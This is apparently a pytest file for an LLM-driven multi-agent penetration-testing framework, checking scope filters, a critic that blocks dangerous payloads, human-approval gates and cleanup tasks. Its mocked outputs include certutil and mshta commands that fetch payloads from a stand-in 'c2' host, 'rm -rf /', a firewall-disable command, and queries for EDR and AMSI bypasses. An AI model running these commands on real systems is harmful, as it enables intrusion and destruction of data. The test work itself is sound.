"""
test_agents.py — Agent 行为验证（mock LLM）

策略：
  - 用 unittest.mock.patch 替换 AsyncAnthropic().messages.create
  - 验证 Agent 输出的 mutations / events 结构和约束
  - 不调用真实 LLM，不访问网络

覆盖：
  ReconAgent:    正常模式、scope 过滤、max tasks 上限
  ExploitAgent:  正常模式 mutations、fixup 模式 mutations、scope 拒绝、fallback
  CriticAgent:   DOS_RISK 硬编码拦截、OUT_OF_SCOPE 硬编码拦截、
                 LLM BLOCKED 路径（HIGH_NOISE）、APPROVED 路径、
                 REQUIRES_APPROVAL 路径
  CleanupAgent:  正常生成 + HUMAN_APPROVAL_REQ 事件、empty footprints、scope 过滤
"""

from __future__ import annotations

import json
import uuid
import pytest
import pytest_asyncio
from unittest.mock import AsyncMock, MagicMock, patch

from agents.recon_agent import ReconAgent, MAX_TASKS_PER_RUN
from agents.exploit_agent import ExploitAgent
from agents.critic_agent import CriticAgent
from agents.cleanup_agent import CleanupAgent

from core.protocols import (
    AgentType,
    Event,
    EventPriority,
    EventType,
    MutationOperation,
    NodeInput,
    NodeOutput,
    PayloadStatus,
    RejectReason,
    StateDomain,
    StateMutation,
    VectorResult,
    VectorType,
)


# ── 辅助函数 ─────────────────────────────────────────────────

def _make_event(etype: EventType = EventType.TASK_COMPLETED) -> Event:
    return Event(
        type=etype,
        payload={},
        source="test",
    )


def _make_node_input(state_view: dict, event: Event | None = None) -> NodeInput:
    return NodeInput(
        state_view=state_view,
        trigger_event=event or _make_event(),
        agent_id="test-agent",
    )


def _mock_llm_response(content: str):
    """返回 AsyncAnthropic messages.create 的 mock 响应对象"""
    msg = MagicMock()
    msg.content = [MagicMock(text=content)]
    msg.usage = MagicMock(input_tokens=100, output_tokens=50)
    return msg


# ── ReconAgent ────────────────────────────────────────────────

class TestReconAgent:

    @pytest.mark.asyncio
    async def test_normal_mode_writes_recon_tasks(self):
        llm_out = json.dumps({
            "think": "need port scan",
            "tasks": [
                {
                    "tool": "port_scan",
                    "target": "10.0.0.5",
                    "params": {},
                    "priority": 8,
                    "noise_cost": 2,
                    "is_async": False,
                    "rationale": "initial scan",
                }
            ],
            "info_needed": None,
        })

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_out, 100)

            agent = ReconAgent()

            inp = _make_node_input({
                "mission":  {"scope": ["10.0.0.0/24"]},
                "focus":    {"active_target": "10.0.0.5"},
                "assets":   {},
                "vectors_summary": {},
                "knowledge": [],
            })
            out = await agent.run(inp)

        assert len(out.mutations) == 1
        m = out.mutations[0]
        assert m.domain == StateDomain.PENDING_RECON
        assert m.payload["tool"] == "port_scan"
        assert m.payload["target"] == "10.0.0.5"

    @pytest.mark.asyncio
    async def test_scope_filter_drops_out_of_scope_targets(self):
        llm_out = json.dumps({
            "think": "scan",
            "tasks": [
                {"tool": "port_scan", "target": "192.168.1.5", "params": {},
                 "priority": 5, "noise_cost": 2, "is_async": False, "rationale": "x"},
            ],
            "info_needed": None,
        })

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_out, 100)

            agent = ReconAgent()

            inp = _make_node_input({
                "mission":  {"scope": ["10.0.0.0/24"]},
                "focus":    {"active_target": "10.0.0.5"},
                "assets":   {},
                "vectors_summary": {},
                "knowledge": [],
            })
            out = await agent.run(inp)

        # Out-of-scope target should be filtered out
        assert len(out.mutations) == 0

    @pytest.mark.asyncio
    async def test_max_tasks_capped_at_five(self):
        tasks = [
            {"tool": "port_scan", "target": f"10.0.0.{i}", "params": {},
             "priority": 5, "noise_cost": 1, "is_async": False, "rationale": "x"}
            for i in range(1, 9)   # 8 tasks, scope allows all
        ]
        llm_out = json.dumps({"think": "scan", "tasks": tasks, "info_needed": None})

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_out, 100)

            agent = ReconAgent()

            inp = _make_node_input({
                "mission":  {"scope": ["10.0.0.0/24"]},
                "focus":    {"active_target": "10.0.0.1"},
                "assets":   {},
                "vectors_summary": {},
                "knowledge": [],
            })
            out = await agent.run(inp)

        assert len(out.mutations) <= MAX_TASKS_PER_RUN


# ── ExploitAgent ──────────────────────────────────────────────

class TestExploitAgent:

    def _make_normal_llm_out(self, target="10.0.0.5:445"):
        return json.dumps({
            "think": "SMB exploit via certutil",
            "candidates": [
                {"technique": "certutil", "content": "certutil -urlcache -f http://c2/a a.exe",
                 "executor_hint": "cmd", "noise_cost": 3, "timeout_ms": 15000, "rationale": "low noise"},
                {"technique": "mshta", "content": "mshta http://c2/b.hta",
                 "executor_hint": "cmd", "noise_cost": 4, "timeout_ms": 15000, "rationale": "fast"},
                {"technique": "wmic", "content": "wmic process call create cmd.exe",
                 "executor_hint": "cmd", "noise_cost": 5, "timeout_ms": 15000, "rationale": "wmi"},
            ],
            "best_idx":    0,
            "target":      target,
            "vector_type": "LOTL",
        })

    @pytest.mark.asyncio
    async def test_normal_mode_writes_payload_and_tried_vector(self):
        from agents.exploit_agent import ExploitAgent

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (self._make_normal_llm_out(), 100)

            agent = ExploitAgent()

            inp = _make_node_input({
                "mission": {"scope": ["10.0.0.0/24"], "risk_level": 3},
                "focus": {
                    "active_target": "10.0.0.5:445",
                    "current_goal": "EXPLOIT",
                    "hypothesis": "EternalBlue",
                    "confidence": 0.7,
                },
                "assets": {"active_host": {"host": {"edr_profile": {"edr": "none"}}}},
                "vectors_summary": {},
                "knowledge": [],
            })
            out = await agent.run(inp)

        domains = [m.domain for m in out.mutations]
        assert StateDomain.PENDING_PAYLOADS in domains
        assert StateDomain.TRIED_VECTORS in domains

        payload_m = next(m for m in out.mutations if m.domain == StateDomain.PENDING_PAYLOADS)
        assert payload_m.payload["status"] == PayloadStatus.PENDING
        assert payload_m.payload["target"] == "10.0.0.5:445"

        vector_m = next(m for m in out.mutations if m.domain == StateDomain.TRIED_VECTORS)
        assert vector_m.payload["result"] == VectorResult.UNKNOWN

    @pytest.mark.asyncio
    async def test_normal_mode_rejects_out_of_scope_target(self):
        from agents.exploit_agent import ExploitAgent

        # LLM returns a target outside scope
        llm_out = self._make_normal_llm_out(target="1.2.3.4:445")

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_out, 100)

            agent = ExploitAgent()

            inp = _make_node_input({
                "mission": {"scope": ["10.0.0.0/24"], "risk_level": 3},
                "focus":   {"active_target": "10.0.0.5:445", "current_goal": "EXPLOIT",
                            "hypothesis": "", "confidence": 0.5},
                "assets":  {},
                "vectors_summary": {},
                "knowledge": [],
            })
            out = await agent.run(inp)

        assert out.mutations == []
        assert out.events == []

    @pytest.mark.asyncio
    async def test_fixup_mode_creates_new_payload_with_parent_id(self):
        from agents.exploit_agent import ExploitAgent

        original_id = str(uuid.uuid4())
        fixup_llm_out = json.dumps({
            "think": "removed & operators",
            "fixed_content": "certutil -urlcache -f http://c2/a a.exe; a.exe",
            "technique": "certutil",
            "executor_hint": "cmd",
            "noise_cost": 2,
            "timeout_ms": 15000,
        })

        reject_event = Event.payload_rejected(
            payload_id=original_id,
            reject_reason=RejectReason.HIGH_NOISE,
            original_payload="certutil ... & certutil ...",
            retry_count=1,
        )

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (fixup_llm_out, 100)

            agent = ExploitAgent()

            inp = NodeInput(
                state_view={
                    "_fixup_mode": True,
                    "mission": {"scope": ["10.0.0.0/24"]},
                    "focus":   {"active_target": "10.0.0.5:445"},
                },
                trigger_event=reject_event,
                agent_id="test",
            )
            out = await agent.run(inp)

        payload_mutations = [m for m in out.mutations if m.domain == StateDomain.PENDING_PAYLOADS]
        assert len(payload_mutations) == 1
        p = payload_mutations[0].payload
        assert p["parent_id"] == original_id
        assert p["retry_count"] == 1
        assert p["status"] == PayloadStatus.PENDING
        # fixup does NOT add new tried_vectors
        vector_mutations = [m for m in out.mutations if m.domain == StateDomain.TRIED_VECTORS]
        assert len(vector_mutations) == 0


# ── CriticAgent ───────────────────────────────────────────────

class TestCriticAgent:

    def _make_payload(self, content: str, target: str = "10.0.0.5",
                      status: str = "PENDING") -> dict:
        return {
            "id":             str(uuid.uuid4()),
            "content":        content,
            "target":         target,
            "vector_type":    "LOTL",
            "executor_hint":  "bash",
            "noise_cost":     3,
            "timeout_ms":     15000,
            "retry_count":    0,
            "parent_id":      None,
            "status":         status,
            "edr_profile":    {},
            "mission_scope":  ["10.0.0.0/24"],
        }

    def _make_mission(self):
        return {"scope": ["10.0.0.0/24"], "risk_level": 3}

    @pytest.mark.asyncio
    async def test_hardcoded_dos_pattern_blocks_without_llm(self):
        from agents.critic_agent import CriticAgent

        payload = self._make_payload("rm -rf / && echo done")
        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:
            mock_llm.side_effect = AssertionError("LLM should not be called")
            agent = CriticAgent()

            inp = _make_node_input({
                "payload": payload,
                "mission": self._make_mission(),
            })
            out = await agent.run(inp)

        # Should be BLOCKED with DOS_RISK
        status_m = next(
            m for m in out.mutations
            if m.domain == StateDomain.PENDING_PAYLOADS
        )
        assert status_m.payload["status"] == PayloadStatus.BLOCKED
        assert status_m.payload["reject_reason"] == RejectReason.DOS_RISK

        # Should emit PAYLOAD_REJECTED (CRITICAL)
        rejected_events = [e for e in out.events if e.type == EventType.PAYLOAD_REJECTED]
        assert len(rejected_events) == 1

    @pytest.mark.asyncio
    async def test_hardcoded_out_of_scope_blocks_without_llm(self):
        from agents.critic_agent import CriticAgent

        payload = self._make_payload("whoami", target="1.2.3.4")  # outside scope
        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:
            mock_llm.side_effect = AssertionError("should not call LLM")
            agent = CriticAgent()

            inp = _make_node_input({
                "payload": payload,
                "mission": self._make_mission(),
            })
            out = await agent.run(inp)

        status_m = next(m for m in out.mutations if m.domain == StateDomain.PENDING_PAYLOADS)
        assert status_m.payload["status"] == PayloadStatus.BLOCKED
        assert status_m.payload["reject_reason"] == RejectReason.OUT_OF_SCOPE

    @pytest.mark.asyncio
    async def test_llm_approved_path_emits_payload_approved(self):
        from agents.critic_agent import CriticAgent

        llm_resp = json.dumps({
            "think": "safe payload",
            "scores": {"noise": 0.3, "stability": 0.9, "destructiveness": 0.0, "compliance": 1.0},
            "verdict": "APPROVED",
            "reject_reason": None,
        })

        payload = self._make_payload("whoami")
        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:
            mock_llm.return_value = (llm_resp, 100)
            agent = CriticAgent()

            inp = _make_node_input({
                "payload": payload,
                "mission": self._make_mission(),
            })
            out = await agent.run(inp)

        status_m = next(m for m in out.mutations if m.domain == StateDomain.PENDING_PAYLOADS)
        assert status_m.payload["status"] == PayloadStatus.APPROVED

        approved_events = [e for e in out.events if e.type == EventType.PAYLOAD_APPROVED]
        assert len(approved_events) == 1

    @pytest.mark.asyncio
    async def test_llm_high_noise_blocked_emits_payload_rejected(self):
        from agents.critic_agent import CriticAgent

        llm_resp = json.dumps({
            "think": "too noisy",
            "scores": {"noise": 0.85, "stability": 0.95, "destructiveness": 0.0, "compliance": 1.0},
            "verdict": "BLOCKED",
            "reject_reason": "HIGH_NOISE",
        })

        payload = self._make_payload("nmap -sV -p- 10.0.0.5")
        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:
            mock_llm.return_value = (llm_resp, 100)
            agent = CriticAgent()

            inp = _make_node_input({
                "payload": payload,
                "mission": self._make_mission(),
            })
            out = await agent.run(inp)

        status_m = next(m for m in out.mutations if m.domain == StateDomain.PENDING_PAYLOADS)
        assert status_m.payload["status"] == PayloadStatus.BLOCKED
        assert status_m.payload["reject_reason"] == RejectReason.HIGH_NOISE

        # Loop A event triggered
        rejected = [e for e in out.events if e.type == EventType.PAYLOAD_REJECTED]
        assert len(rejected) == 1 and rejected[0].priority == EventPriority.CRITICAL

        # tried_vectors APPEND with CRITIC_BLOCKED
        vec_m = [m for m in out.mutations if m.domain == StateDomain.TRIED_VECTORS]
        assert len(vec_m) == 1
        assert vec_m[0].payload["result"] == VectorResult.CRITIC_BLOCKED

    @pytest.mark.asyncio
    async def test_requires_approval_does_not_trigger_loop_a(self):
        from agents.critic_agent import CriticAgent

        llm_resp = json.dumps({
            "think": "needs human review",
            "scores": {"noise": 0.5, "stability": 0.9, "destructiveness": 0.1, "compliance": 1.0},
            "verdict": "REQUIRES_APPROVAL",
            "reject_reason": "REQUIRES_APPROVAL",
        })

        payload = self._make_payload("netsh advfirewall set allprofiles state off")
        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:
            mock_llm.return_value = (llm_resp, 100)
            agent = CriticAgent()

            inp = _make_node_input({
                "payload": payload,
                "mission": self._make_mission(),
            })
            out = await agent.run(inp)

        status_m = next(m for m in out.mutations if m.domain == StateDomain.PENDING_PAYLOADS)
        assert status_m.payload["status"] == PayloadStatus.REQUIRES_APPROVAL

        # HUMAN_APPROVAL_REQ emitted
        human_req = [e for e in out.events if e.type == EventType.HUMAN_APPROVAL_REQ]
        assert len(human_req) == 1

        # NO PAYLOAD_REJECTED — Loop A must NOT trigger
        rejected = [e for e in out.events if e.type == EventType.PAYLOAD_REJECTED]
        assert len(rejected) == 0


# ── CleanupAgent ──────────────────────────────────────────────

class TestCleanupAgent:

    def _make_footprint(self, fp_id: str, target: str = "10.0.0.5",
                         fp_type: str = "FILE_CREATE", ts: str = "2025-01-01T10:00:00") -> dict:
        return {
            "id":     fp_id,
            "type":   fp_type,
            "target": target,
            "ts":     ts,
            "detail": {},
        }

    @pytest.mark.asyncio
    async def test_generates_cleanup_tasks_and_human_approval_event(self):
        from agents.cleanup_agent import CleanupAgent

        llm_resp = json.dumps({
            "think": "reverse 2 footprints",
            "tasks": [
                {"footprint_id": "fp1", "target": "10.0.0.5", "operation": "delete file",
                 "executor_hint": "bash", "content": "rm /tmp/shell.sh",
                 "reversible": True, "noise_cost": 1, "timeout_ms": 5000, "rationale": "cleanup"},
                {"footprint_id": "fp2", "target": "10.0.0.5", "operation": "kill process",
                 "executor_hint": "bash", "content": "kill -9 1234",
                 "reversible": True, "noise_cost": 1, "timeout_ms": 5000, "rationale": "cleanup"},
            ],
            "irreversible_count": 0,
            "report_summary": "cleaned 2 footprints",
        })

        fps = [
            self._make_footprint("fp2", ts="2025-01-01T11:00:00"),
            self._make_footprint("fp1", ts="2025-01-01T10:00:00"),
        ]
        mission = {"scope": ["10.0.0.0/24"], "id": "m1"}

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_resp, 100)

            agent = CleanupAgent()

            inp = _make_node_input({
                "footprints":     fps,
                "mission":        mission,
                "trigger_reason": "MISSION_COMPLETE",
            })
            out = await agent.run(inp)

        cleanup_ms = [m for m in out.mutations if m.domain == StateDomain.PENDING_CLEANUP]
        assert len(cleanup_ms) == 2
        for m in cleanup_ms:
            assert m.payload["status"] == "PENDING_HUMAN"

        human_events = [e for e in out.events if e.type == EventType.HUMAN_APPROVAL_REQ]
        assert len(human_events) == 1
        assert human_events[0].priority == EventPriority.CRITICAL
        assert human_events[0].payload["task_count"] == 2

    @pytest.mark.asyncio
    async def test_empty_footprints_returns_no_output(self):
        from agents.cleanup_agent import CleanupAgent

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.side_effect = AssertionError("should not call LLM")

            agent = CleanupAgent()

            inp = _make_node_input({
                "footprints":     [],
                "mission":        {"scope": ["10.0.0.0/24"]},
                "trigger_reason": "CLEANUP_STATE",
            })
            out = await agent.run(inp)

        assert out.mutations == []
        assert out.events == []

    @pytest.mark.asyncio
    async def test_scope_filter_drops_out_of_scope_tasks(self):
        from agents.cleanup_agent import CleanupAgent

        # LLM returns a task for a target outside scope
        llm_resp = json.dumps({
            "think": "cleanup",
            "tasks": [
                {"footprint_id": "fp1", "target": "1.2.3.4", "operation": "del",
                 "executor_hint": "bash", "content": "rm /tmp/x",
                 "reversible": True, "noise_cost": 1, "timeout_ms": 5000, "rationale": "x"},
            ],
            "irreversible_count": 0,
            "report_summary": "done",
        })

        fps = [self._make_footprint("fp1", target="10.0.0.5")]
        mission = {"scope": ["10.0.0.0/24"]}

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_resp, 100)

            agent = CleanupAgent()

            inp = _make_node_input({
                "footprints":     fps,
                "mission":        mission,
                "trigger_reason": "MANUAL",
            })
            out = await agent.run(inp)

        cleanup_ms = [m for m in out.mutations if m.domain == StateDomain.PENDING_CLEANUP]
        assert len(cleanup_ms) == 0   # out-of-scope task was filtered


# ── Knowledge Query ─────────────────────────────────────────

class TestKnowledgeQuery:

    @pytest.mark.asyncio
    async def test_recon_agent_returns_knowledge_query_mutation(self):
        """Recon Agent 返回 knowledge_query 时，生成 KNOWLEDGE_QUERY mutation"""
        from agents.recon_agent import ReconAgent

        llm_out = json.dumps({
            "think": "need to check Log4Shell details",
            "tasks": [],
            "info_needed": None,
            "knowledge_query": {
                "query": "CVE-2021-44228 Log4Shell payload",
                "type": "CVE",
                "reason": "found Log4j service, need exact payload",
            },
        })

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_out, 100)

            agent = ReconAgent()

            inp = _make_node_input({
                "mission": {"scope": ["10.0.0.0/24"]},
                "focus": {"active_target": "10.0.0.5"},
                "assets": {},
                "vectors_summary": {},
                "knowledge": [],
            })
            out = await agent.run(inp)

        kq_mutations = [
            m for m in out.mutations
            if m.domain == StateDomain.KNOWLEDGE_QUERY
        ]
        assert len(kq_mutations) == 1
        kq = kq_mutations[0]
        assert kq.payload["query"] == "CVE-2021-44228 Log4Shell payload"
        assert kq.payload["type"] == "CVE"
        assert kq.payload["source_agent"] == "recon"
        assert kq.operation == MutationOperation.APPEND

    @pytest.mark.asyncio
    async def test_exploit_agent_normal_mode_knowledge_query(self):
        """Exploit Agent 正常模式返回 knowledge_query 时，生成 KNOWLEDGE_QUERY mutation"""
        from agents.exploit_agent import ExploitAgent

        llm_out = json.dumps({
            "think": "need CrowdStrike bypass",
            "candidates": [
                {"technique": "ntdll unhook", "content": "powershell ...",
                 "executor_hint": "powershell", "noise_cost": 3,
                 "timeout_ms": 15000, "rationale": "direct syscall"},
                {"technique": "reflective", "content": "powershell ...",
                 "executor_hint": "powershell", "noise_cost": 5,
                 "timeout_ms": 15000, "rationale": "fast"},
                {"technique": "wmic", "content": "wmic ...",
                 "executor_hint": "cmd", "noise_cost": 2,
                 "timeout_ms": 15000, "rationale": "wmi"},
            ],
            "best_idx": 0,
            "target": "10.0.0.5:445",
            "vector_type": "LOTL",
            "knowledge_query": {
                "query": "CrowdStrike Falcon ntdll unhook technique",
                "type": "Bypass",
                "reason": "need latest unhook method",
            },
        })

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_out, 100)

            agent = ExploitAgent()

            inp = _make_node_input({
                "mission": {"scope": ["10.0.0.0/24"], "risk_level": 3},
                "focus": {
                    "active_target": "10.0.0.5:445",
                    "current_goal": "EXPLOIT",
                    "hypothesis": "CrowdStrike present",
                    "confidence": 0.6,
                },
                "assets": {"active_host": {"host": {"edr_profile": {"detected_products": ["CrowdStrike"]}}}},
                "vectors_summary": {},
                "knowledge": [],
            })
            out = await agent.run(inp)

        domains = [m.domain for m in out.mutations]
        assert StateDomain.KNOWLEDGE_QUERY in domains
        kq = next(m for m in out.mutations if m.domain == StateDomain.KNOWLEDGE_QUERY)
        assert kq.payload["type"] == "Bypass"
        assert kq.payload["source_agent"] == "exploit"

        # pending_payloads 仍然存在
        assert StateDomain.PENDING_PAYLOADS in domains

    @pytest.mark.asyncio
    async def test_fixup_mode_knowledge_query_with_high_priority(self):
        """快速修正模式下的 knowledge_query 应该是 HIGH 优先级"""
        from agents.exploit_agent import ExploitAgent

        original_id = str(uuid.uuid4())
        fixup_llm_out = json.dumps({
            "think": "need EDR bypass for fixup",
            "fixed_content": "powershell -ep bypass -c ...",
            "technique": "powershell",
            "executor_hint": "powershell",
            "noise_cost": 2,
            "timeout_ms": 15000,
            "knowledge_query": {
                "query": "AMSI bypass PowerShell reflection",
                "type": "Bypass",
                "reason": "Critic flagged HIGH_NOISE, need stealthier technique",
            },
        })

        reject_event = Event.payload_rejected(
            payload_id=original_id,
            reject_reason=RejectReason.HIGH_NOISE,
            original_payload="powershell -c whoami",
            retry_count=1,
        )

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (fixup_llm_out, 100)

            agent = ExploitAgent()

            inp = NodeInput(
                state_view={"_fixup_mode": True},
                trigger_event=reject_event,
                agent_id="test",
            )
            out = await agent.run(inp)

        kq_mutations = [
            m for m in out.mutations
            if m.domain == StateDomain.KNOWLEDGE_QUERY
        ]
        assert len(kq_mutations) == 1
        assert kq_mutations[0].payload["priority"] == "HIGH"
        assert kq_mutations[0].payload["type"] == "Bypass"

    @pytest.mark.asyncio
    async def test_recon_agent_no_knowledge_query_when_absent(self):
        """LLM 输出中无 knowledge_query 时，不应生成 KNOWLEDGE_QUERY mutation"""
        from agents.recon_agent import ReconAgent

        llm_out = json.dumps({
            "think": "all info available",
            "tasks": [
                {"tool": "port_scan", "target": "10.0.0.5", "params": {},
                 "priority": 5, "noise_cost": 2, "is_async": False, "rationale": "scan"},
            ],
            "info_needed": None,
            "knowledge_query": None,
        })

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_out, 100)

            agent = ReconAgent()

            inp = _make_node_input({
                "mission": {"scope": ["10.0.0.0/24"]},
                "focus": {"active_target": "10.0.0.5"},
                "assets": {},
                "vectors_summary": {},
                "knowledge": [],
            })
            out = await agent.run(inp)

        kq_mutations = [
            m for m in out.mutations
            if m.domain == StateDomain.KNOWLEDGE_QUERY
        ]
        assert len(kq_mutations) == 0

    @pytest.mark.asyncio
    async def test_knowledge_query_type_validation_fallback(self):
        """非法 type 值应回退到默认值"""
        from agents.recon_agent import ReconAgent

        llm_out = json.dumps({
            "think": "check unknown type",
            "tasks": [],
            "info_needed": None,
            "knowledge_query": {
                "query": "some exploit",
                "type": "INVALID_TYPE",
                "reason": "test",
            },
        })

        with patch("core.llm_provider.call_llm_anthropic_style", new_callable=AsyncMock) as mock_llm:

            mock_llm.return_value = (llm_out, 100)

            agent = ReconAgent()

            inp = _make_node_input({
                "mission": {"scope": ["10.0.0.0/24"]},
                "focus": {"active_target": "10.0.0.5"},
                "assets": {},
                "vectors_summary": {},
                "knowledge": [],
            })
            out = await agent.run(inp)

        kq = next(
            m for m in out.mutations
            if m.domain == StateDomain.KNOWLEDGE_QUERY
        )
        assert kq.payload["type"] == "Methodology"  # fallback
